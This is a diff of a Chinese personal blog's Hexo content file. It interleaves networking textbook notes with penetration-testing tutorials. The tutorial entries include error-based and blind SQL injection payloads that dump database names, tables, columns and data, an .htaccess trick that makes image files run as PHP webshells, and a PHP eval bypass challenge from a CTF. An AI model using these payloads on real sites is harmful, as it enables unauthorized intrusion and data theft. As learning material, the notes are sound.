-<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
-</ul>
-<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
-<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
-<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
-</ul>
-<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
-<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
-<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
-<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
-</ul>
-<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
-<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
-<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
-<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
-</ul>
-<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
-<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
-</li>
-<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
-</li>
-<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
-<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
-</li>
-<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
-</li>
-</ul>
-<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
-    <url>/2022/01/11/read-1.1/</url>
-    <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
-<p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p>
-<p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p>
-<span id="more"></span>
-<ul>
-<li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li>
-<li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li>
-<li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li>
-<li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li>
-<li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul>
-<li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li>
-<li>各 ISP 为端系统提供了各种不同类型的网络接入</li>
-<li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li>
-<li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li>
-</ul>
-</li>
-<li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li>
-<li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul>
-<li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li>
-<li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li>
-</ul>
-</li>
-</ul>
-<h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p>
-<p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p>
-<p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p>
-<p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p>
-<p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p>
-<p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p>
-<h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p>
-<p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p>
-<h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p>
-<p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p>
-<p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入</title>
-    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
-    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
-<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
-<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
-<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
-<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
-<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
-<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
-<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
-<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
-<p><strong>注入流程</strong>：</p>
-<ul>
-<li>数据库长度</li>
-<li>数据库表的ascii</li>
-<li>数据库中表的个数</li>
-<li>数据库中其中一个表名的长度</li>
-<li>数据库中其中一个表名的ascii</li>
-<li>列名的数量</li>
-<li>列名的长度</li>
-<li>列名的ascii</li>
-<li>字段的数量</li>
-<li>字段内容的长度</li>
-<li>字段内容对应的ascii</li>
-</ul>
-<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
-<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
-<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
-<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
-<li><p>插入恶意数据</p>
-<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
-</li>
-<li><p>引用恶意数据</p>
-<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
-</li>
-</ol>
-<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
-<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《计算机网络自顶向下方法》（计算机网络和因特网）（2）</title>
     <url>/2022/01/11/read-1.2/</url>
     <content><![CDATA[<h1 id="0x02-网络边缘"><a href="#0x02-网络边缘" class="headerlink" title="0x02 网络边缘"></a>0x02 网络边缘</h1><p>回想前一节计算机网络的术语，通常把与因特网相连的计算机和其他设备成为端系统，之所以称为端系统，因为它们位于因特网的边缘</p>
@@ -2442,6 +2552,100 @@
 <p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
 <p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
 <p>将密码用md5解密，登录成功后即可获得key</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
+    <url>/2022/01/11/read-1.1/</url>
+    <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
+<p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p>
+<p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p>
+<span id="more"></span>
+<ul>
+<li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li>
+<li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li>
+<li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li>
+<li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li>
+<li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul>
+<li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li>
+<li>各 ISP 为端系统提供了各种不同类型的网络接入</li>
+<li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li>
+<li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li>
+</ul>
+</li>
+<li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li>
+<li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul>
+<li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li>
+<li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li>
+</ul>
+</li>
+</ul>
+<h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p>
+<p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p>
+<p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p>
+<p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p>
+<p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p>
+<p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p>
+<h2 id="1-3-什么是协议？"><a href="#1-3-什么是协议？" class="headerlink" title="1.3 什么是协议？"></a>1.3 什么是协议？</h2><h3 id="1-3-1-人类活动的类比"><a href="#1-3-1-人类活动的类比" class="headerlink" title="1.3.1 人类活动的类比"></a>1.3.1 人类活动的类比</h3><p>​        人类协议要求一方首先进行问候（如：你好），以开始与另一个人的通信。对 “你好” 的典型响应是返回一个 ”你好“ 报文，此时发话者可以继续向此人进行提问。而如果对 ”你好“ 的响应是 ”我没空“ 或某些不合时宜的回答，这就表明了一个勉强的或不能进行的通信，在此情况下，按照人类协议，发话者就不能再继续提问了。显然，发送和接收的报文、以及这些报文发送和接收所采取的动作，这些在一个人类协议中起到了核心作用。</p>
+<p>​        如果人们使用不同的协议（例如：一人理解这句话的意思，但另一人不理解），这些协议就不能交互，因而不能完成有用的工作。在网络中这个道理同样成立，即为了完成一项工作，要求两个（或多个）通信实体运行相同的协议。</p>
+<h3 id="1-3-2-网络协议"><a href="#1-3-2-网络协议" class="headerlink" title="1.3.2 网络协议"></a>1.3.2 网络协议</h3><p>​        网络协议类似于人类协议，除了交换报文和采取动作的实体是某些设备（计算机、智能手机、路由器等）的硬件或软件组件</p>
+<p>​        当你向一个Web服务器发出请求（即你在Web服务器中键入一个网页的URL），首先、你的计算机将向该Web服务器发送一条连接请求报文，并等待应答。若该Web服务器最终能接收到连接请求报文，就会返回一条连接响应报文。得知请求Web文档正常以后，计算机则在一条GET报文中发送要从这台web服务器上取回的网页名字。最后、web服务器向计算机返回该web网页（文件）。</p>
+<p>​        <strong>协议（protocol）</strong>定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送 和/或 接收一条报文或其他事件所采取的动作。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
+    <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
+<p>爆表名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
+<p>爆列名：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
+<h3 id="2、通过floor报错"><a href="#2、通过floor报错" class="headerlink" title="2、通过floor报错"></a>2、通过floor报错</h3><p><code>&#39;and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="3、通过extractvalue报错"><a href="#3、通过extractvalue报错" class="headerlink" title="3、通过extractvalue报错"></a>3、通过extractvalue报错</h3><p>爆数据库名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
+<p>爆表名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
+<p>爆列名：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
+<p>爆字段数据：<code>&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
+<h2 id="二、布尔盲注"><a href="#二、布尔盲注" class="headerlink" title="二、布尔盲注"></a>二、布尔盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
+<p><strong>注入流程</strong>：</p>
+<ul>
+<li>数据库长度</li>
+<li>数据库表的ascii</li>
+<li>数据库中表的个数</li>
+<li>数据库中其中一个表名的长度</li>
+<li>数据库中其中一个表名的ascii</li>
+<li>列名的数量</li>
+<li>列名的长度</li>
+<li>列名的ascii</li>
+<li>字段的数量</li>
+<li>字段内容的长度</li>
+<li>字段内容对应的ascii</li>
+</ul>
+<h2 id="三、延时盲注"><a href="#三、延时盲注" class="headerlink" title="三、延时盲注"></a>三、延时盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
+<h2 id="四、加解密注入"><a href="#四、加解密注入" class="headerlink" title="四、加解密注入"></a>四、加解密注入</h2><p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
+<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
+<h2 id="五、二次注入"><a href="#五、二次注入" class="headerlink" title="五、二次注入"></a>五、二次注入</h2><ol>
+<li><p>插入恶意数据</p>
+<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
+</li>
+<li><p>引用恶意数据</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
+</li>
+</ol>
+<h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
+<p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -2701,6 +2905,27 @@
       </tags>
   </entry>
   <entry>
+    <title>.htaccess文件上传漏洞</title>
+    <url>/2022/01/09/upload-1/</url>
+    <content><![CDATA[<p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>需要用到的代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .png .jpg</span><br></pre></td></tr></table></figure>
+<p>通过<code>.htaccess</code>文件，调用<code>php</code>的解析器解析一个文件名只要是<code>.png</code> <code>.jpg</code>格式的文件，可以自己视实际情况添加。这个文件的内容如果是一句话木马，即可利用中国菜刀进行连接。</p>
+<h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol>
+<li>如果存在可以上传<code>.htaccess</code>文件，就可以直接利用规则解析</li>
+<li>如果存在修改<code>.htaccess</code>文件权限，修改解析规则</li>
+</ol>
+<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP反序列化</title>
     <url>/2022/03/26/unserialize/</url>
     <content><![CDATA[<h1 id="一、什么是反序列化？"><a href="#一、什么是反序列化？" class="headerlink" title="一、什么是反序列化？"></a>一、什么是反序列化？</h1><p>首先我们要知道什么是序列化，我们在php里定义一个class，这个class里存储着一些变量和数据，如果这个class一直不销毁，就会浪费系统资源，在一些大型项目里可能就会产生问题，因此，我们可以把这个对象<strong>序列化</strong>(serialize)，以<strong>字符串</strong>的形式存储起来，当需要用的时候再将它进行<strong>反序列化</strong>(unserialize)回来就可以了。</p>
@@ -2771,27 +2996,6 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>.htaccess文件上传漏洞</title>
-    <url>/2022/01/09/upload-1/</url>
-    <content><![CDATA[<p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>需要用到的代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php .png .jpg</span><br></pre></td></tr></table></figure>
-<p>通过<code>.htaccess</code>文件，调用<code>php</code>的解析器解析一个文件名只要是<code>.png</code> <code>.jpg</code>格式的文件，可以自己视实际情况添加。这个文件的内容如果是一句话木马，即可利用中国菜刀进行连接。</p>
-<h3 id="实战意义："><a href="#实战意义：" class="headerlink" title="实战意义："></a>实战意义：</h3><ol>
-<li>如果存在可以上传<code>.htaccess</code>文件，就可以直接利用规则解析</li>
-<li>如果存在修改<code>.htaccess</code>文件权限，修改解析规则</li>
-</ol>
-<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -2926,6 +3130,29 @@
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2021 GUET梦极光杯</title>
+    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>有一道web题，源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
+<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> 